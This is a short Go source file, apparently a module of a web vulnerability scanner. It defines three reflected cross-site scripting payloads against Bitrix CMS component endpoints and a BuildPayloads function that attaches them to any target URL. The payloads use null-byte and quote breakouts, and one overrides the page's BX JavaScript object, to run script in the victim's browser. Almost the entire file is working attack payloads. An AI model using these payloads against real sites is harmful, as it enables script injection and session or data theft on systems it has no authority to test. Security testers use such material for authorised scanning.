package xss

const (
	endpoint1 = `/bitrix/components/bitrix/map.google.view/settings/settings.php?arParams[API_KEY]=123'-'%00'-alert(document.domain)-'`
	endpoint2 = `/bitrix/components/bitrix/photogallery_user/templates/.default/galleries_recalc.php?AJAX=Y&arParams[PERMISSION]=W&arParams[IBLOCK_ID]=1%00'}};alert(document.domain);if(1){//`
	endpoint3 = `/bitrix/components/bitrix/mobileapp.list/ajax.php/?=&AJAX_CALL=Y&items%5BITEMS%5D%5BBOTTOM%5D%5BLEFT%5D=&items%5BITEMS%5D%5BTOGGLABLE%5D=test123&=&items%5BITEMS%5D%5BID%5D=%3Cimg+src=%22//%0d%0a)%3B//%22%22%3E%3Cdiv%3Ex%0d%0a%7D)%3Bvar+BX+=+window.BX%3Bwindow.BX+=+function(node,+bCache)%7B%7D%3BBX.ready+=+function(handler)%7B%7D%3Bfunction+__MobileAppList(test)%7Balert(document.location)%3B%7D%3B//%3C/div%3E`
)

func BuildPayloads(target string) ([]string, error) {
	var pages []string
	endpoints := []string{endpoint1, endpoint2, endpoint3}

	for _, v := range endpoints {
		url := target + v
		pages = append(pages, url)
	}
	return pages, nil
}
